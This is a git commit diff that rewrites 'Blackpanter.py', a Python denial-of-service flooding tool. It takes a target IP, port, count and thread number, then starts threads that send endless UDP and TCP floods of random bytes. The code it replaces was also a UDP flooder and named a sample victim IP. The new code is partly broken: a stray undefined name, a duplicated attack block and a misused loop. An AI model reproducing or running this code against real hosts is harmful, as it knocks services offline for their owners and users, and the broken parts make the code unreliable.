551362c2d0d34d688aa87255da2e53657f6b023c
KUNF24 <kunf5616@gmail.com>
2024-11-19 00:07:48 +0700

    Update Blackpanter.py

--- Blackpanter.py
+++ Blackpanter.py
@@ -1,13 +1,111 @@
 # -*- coding: utf-8 -*-
-import time
-import socket
+#
 import random
-import sys
+import socket
+import threading
 import os
-import fade
-os.system("git pull")
-os.system("")
-logo =  """
+import sys
+import time
+os.system("clear")
+
+
+attemps = 0
+
+while attemps < 100:
+    username = input('Enter your username: ')
+    password = input('Enter your password: ')
+
+    if username == 'NUDOS' and password == 'NUDOS':
+        print('You have successfully logged in Welcome to NUDOS!!')
+        break
+    else:
+        print('Incorrect credentials. Check if you have Caps lock on and try again.')
+        attemps += 1
+        continue
+os.system("clear")
+
+(logioooooo)
+
+ip = str(input(" Target IP :"))
+port = int(input(" Target Port :"))
+choice = str(input(" (y/n) :"))
+times = int(input(" Time :"))
+threads = int(input(" Threads :"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"Attack Sent!!!")
+		except:
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(999)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
+		except:
+			s.close()
+			print("[*] Error!!!")
+            
+
+def run3():
+	data = random._urandom(818)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
+		except:
+			s.close()
+			print("[*] Error!!!")
+            
+  
+def run4():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
+		except:
+			s.close()
+			print("[*] Error!!!")
+											
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+else:
+		th = threading.Thread(target = run4)
+		th.start()
+logo = """
+     
+
         @ @ @ @ @    @     @ @ @ @ @ @ @    @ @ @  @       @
         @         @  @      @         @   @        @     @
         @         @  @       @       @   @         @   @
@@ -22,33 +120,84 @@ logo =  """
         @        @     @  @     @     @     @ @ @ @  @     @
    °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
 """
-print "starting in 5 seconds....."
-time.sleep(5
 
-def usage():
-	os.system()
-        print "Usage : python2 Blacpanter.py 196.220.60.200 80 100"
+ip = str(input(" Target IP :"))
+port = int(input(" Target Port :"))
+choice = str(input(" (y/n) :"))
+times = int(input(" Time :"))
+threads = int(input(" Threads :"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"Attack Sent!!!")
+		except:
+			print("[!] Error!!!")
 
-def flood(victim, vport, duration):
-    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(20000)
-    timeout =  time.time() + duration
-    sent = 3000
+def run2():
+	data = random._urandom(999)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
+		except:
+			s.close()
+			print("[*] Error!!!")
+            
 
-    while 1:
-        if time.time() > timeout:
-            break
-        else:
-            pass
-        client.sendto(bytes, (victim, vport))
-        sent = sent + 1
-        print "\033[1;91mStatus \033[1;32m%s \033[1;91mSending packets to \033[1;32m%s \033[1;91mOn port \033[1;32m%s "%(sent, victim, vport)
-def main():
-    print len(sys.argv)
-    if len(sys.argv) != 4:
-        usage()
-    else:
-        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+def run3():
+	data = random._urandom(818)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
+		except:
+			s.close()
+			print("[*] Error!!!")
+            
+  
+def run4():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
+		except:
+			s.close()
+			print("[*] Error!!!")
+											
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+else:
+		th = threading.Thread(target = run4)
+		th.start()
 
-if __name__ == '__main__':
-    main()
+
+     
